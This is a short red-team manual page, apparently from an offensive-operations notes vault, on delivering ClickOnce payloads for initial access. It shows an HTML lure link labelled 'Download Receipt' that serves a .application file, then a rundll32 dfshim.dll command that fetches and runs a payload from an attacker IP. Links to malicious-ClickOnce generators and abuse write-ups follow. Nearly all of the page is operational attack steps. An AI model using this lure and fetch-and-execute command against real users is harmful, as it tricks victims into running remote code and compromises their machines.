# Manual

## Host Payload

```
<a href="ClickOnce.application" download>Download Receipt</a>
```

## Execute Payload

```
C:\> rundll32.exe dfshim.dll,ShOpenVerbApplication http[s]://<attacker_IP>/payload.application
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/NTLM Relay Attack/Manual]]

### Source Repositories

- [zyn3rgy: ClickonceHunter (search for ClickOnce .NET `.application` files)](https://github.com/zyn3rgy/ClickonceHunter)

- [api0cradle: RedTeamScripts (to download the `.application` malware from malicious links)](https://github.com/api0cradle/RedTeamScripts)

- [Mr-Un1k0d3r: MaliciousClickOnceGenerator](https://github.com/Mr-Un1k0d3r/MaliciousClickOnceGenerator)

- [0xthirteen: AssemblyHunter](https://github.com/0xthirteen/AssemblyHunter)

### Bophos

- [Bohops: ClickOnce (Twice or Thrice): A Technique for Social Engineering and (Un)trusted Command Execution](https://bohops.com/2017/12/02/clickonce-twice-or-thrice-a-technique-for-social-engineering-and-untrusted-command-execution/)

### Bordergate

- [Bordergate: ClickOnce Droppers](https://www.bordergate.co.uk/clickonce-droppers/)

### Security Bouleva

- [Security Bouleva: Less SmartScreen More Caffeine - (Ab)Using ClickOnce for Trusted Code Execution](https://securityboulevard.com/2023/06/less-smartscreen-more-caffeine-abusing-clickonce-for-trusted-code-execution/)